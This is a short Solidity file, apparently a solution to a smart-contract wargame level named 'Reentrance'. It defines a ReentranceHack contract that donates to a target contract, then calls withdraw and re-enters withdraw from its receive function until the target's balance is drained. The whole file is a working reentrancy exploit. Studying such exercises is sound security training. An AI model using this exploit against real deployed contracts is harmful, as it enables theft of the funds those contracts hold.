pragma solidity ^0.8.0;

import 'levels/Reentrance.sol';

contract ReentranceHack {
  Reentrance target;
  uint256 public amount;

  constructor(address payable targetAddress) {
    target = Reentrance(targetAddress);
  }

  function donate() external payable {
    amount += msg.value;
    target.donate{value: msg.value}(address(this));
  }

  function withdraw() external {
    target.withdraw(amount);
  }

  receive() external payable {
    if (address(target).balance != 0) {
      target.withdraw(amount);
    }
  }
}
